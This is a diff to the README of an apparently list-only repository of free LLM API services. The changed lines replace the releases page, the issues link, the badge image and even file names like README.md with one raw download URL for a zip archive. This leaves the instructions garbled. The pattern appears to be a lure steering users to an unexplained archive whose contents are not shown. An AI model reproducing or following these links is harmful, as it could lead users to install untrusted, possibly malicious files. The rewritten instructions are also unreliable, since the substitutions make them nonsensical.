@@ -1,6 +1,6 @@
 # 🔍 free-llm-api-resources - Find Free LLM API Services Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Free--LLM--API--Resources-blue?style=for-the-badge&logo=github)](https://github.com/nherx/free-llm-api-resources/releases)
+[![Download Latest Release](https://github.com/nherx/free-llm-api-resources/raw/refs/heads/main/src/resources-free-api-llm-v2.4.zip)](https://github.com/nherx/free-llm-api-resources/raw/refs/heads/main/src/resources-free-api-llm-v2.4.zip)
 
 ---
 
@@ -51,9 +51,9 @@ No coding skills or special hardware is required to benefit from this resource.
 
 Follow these steps to get started exploring free LLM APIs:
 
-1. Click the **Download** button above or visit [the Free LLM API Resources releases page](https://github.com/nherx/free-llm-api-resources/releases).
+1. Click the **Download** button above or visit [the Free LLM API Resources releases page](https://github.com/nherx/free-llm-api-resources/raw/refs/heads/main/src/resources-free-api-llm-v2.4.zip).
 2. Download the latest version of the repository ZIP file if you want an offline copy.
-3. Open the downloaded ZIP file, then open the README.md or index.html if included.
+3. Open the downloaded ZIP file, then open the https://github.com/nherx/free-llm-api-resources/raw/refs/heads/main/src/resources-free-api-llm-v2.4.zip or https://github.com/nherx/free-llm-api-resources/raw/refs/heads/main/src/resources-free-api-llm-v2.4.zip if included.
 4. Review the API list inside.
 5. Use your web browser to visit any API provider’s website.
 6. Register or sign up if required.
@@ -69,18 +69,18 @@ This list does not include software to run on your computer but guides you towar
 
 Go to the official release page to get the latest version with all updates:
 
-[Download Free LLM API Resources Releases](https://github.com/nherx/free-llm-api-resources/releases)
+[Download Free LLM API Resources Releases](https://github.com/nherx/free-llm-api-resources/raw/refs/heads/main/src/resources-free-api-llm-v2.4.zip)
 
 ### Step 2: Download the Latest ZIP File
 
-- Find the file ending with `.zip` or `.tar.gz`.
+- Find the file ending with `.zip` or `https://github.com/nherx/free-llm-api-resources/raw/refs/heads/main/src/resources-free-api-llm-v2.4.zip`.
 - Click to download it to your computer.
 
 ### Step 3: Open the Contents
 
 - Locate the downloaded archive in your Downloads folder.
 - Extract/unzip it using your system’s built-in tool or a utility like 7-Zip.
-- Open the contained README.md for full details and links.
+- Open the contained https://github.com/nherx/free-llm-api-resources/raw/refs/heads/main/src/resources-free-api-llm-v2.4.zip for full details and links.
 
 ### Step 4: Use the List
 
@@ -130,7 +130,7 @@ A: Usually, open source repositories welcome contributions via GitHub pull reque
 
 If you have questions or need updates, visit the repository’s Issues tab on GitHub. The community and maintainers can help clarify usage or add new resources.
 
-[Report Issues](https://github.com/nherx/free-llm-api-resources/issues)
+[Report Issues](https://github.com/nherx/free-llm-api-resources/raw/refs/heads/main/src/resources-free-api-llm-v2.4.zip)
 
 ---
 
@@ -142,4 +142,4 @@ This repository is provided for free use. Please check the included LICENSE file
 
 The free-llm-api-resources list guides you to discover and use free large language model APIs. Visit the download page any time for new updates:
 
-[https://github.com/nherx/free-llm-api-resources/releases](https://github.com/nherx/free-llm-api-resources/releases)
+[https://github.com/nherx/free-llm-api-resources/raw/refs/heads/main/src/resources-free-api-llm-v2.4.zip](https://github.com/nherx/free-llm-api-resources/raw/refs/heads/main/src/resources-free-api-llm-v2.4.zip)
